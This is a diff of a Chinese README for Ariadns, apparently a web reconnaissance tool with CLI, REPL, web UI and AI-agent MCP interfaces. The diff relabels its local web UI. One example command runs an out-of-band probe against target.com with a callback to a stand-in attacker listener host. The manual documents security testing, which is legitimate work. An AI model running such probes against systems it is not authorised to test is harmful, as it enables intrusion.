@@ -17,7 +17,7 @@
 flowchart TD
     subgraph Interfaces ["三端對等操作介面 (Tri-Parity Interfaces)"]
         CLI["人類 CLI (ariadns / recon.py)"]
-        UI["本地視覺鑑識工作台 (ariadns ui)"]
+        UI["本地網域公開情資分析平台 (ariadns ui)"]
         REPL["互動式終端控制台 (ariadns repl)"]
         MCP["AI Agent FastMCP Server (ariadns-mcp)"]
     end
@@ -93,7 +93,7 @@ ariadns init
 
 ## 二、人類使用說明書（Human Operator Manual）
 
-Ariadns 提供 **一鍵全自動 CLI**、**分步工作階段 CLI**、**互動式 REPL** 與 **本地 Web UI 鑑識工作台**。
+Ariadns 提供 **一鍵全自動 CLI**、**分步工作階段 CLI**、**互動式 REPL** 與 **本地網域公開情資分析平台 (Web UI)**。
 
 ### 1. 一鍵全流程 CLI 模式
 
@@ -158,7 +158,7 @@ Ariadns 提供 **一鍵全自動 CLI**、**分步工作階段 CLI**、**互動�
   ariadns manual-oob -t https://target.com/preview -c https://attacker-listener.com/callback --ack-risk
   ```
 
-### 3. 本地視覺鑑識工作台（Local Web UI Workbench）
+### 3. 本地網域公開情資分析平台（Local Web UI Platform）
 
 包裝完整 CLI 能力的高密度視覺化操作介面（遵循 Impeccable 設計系統，零無效 AI 卡片）：
 ```bash
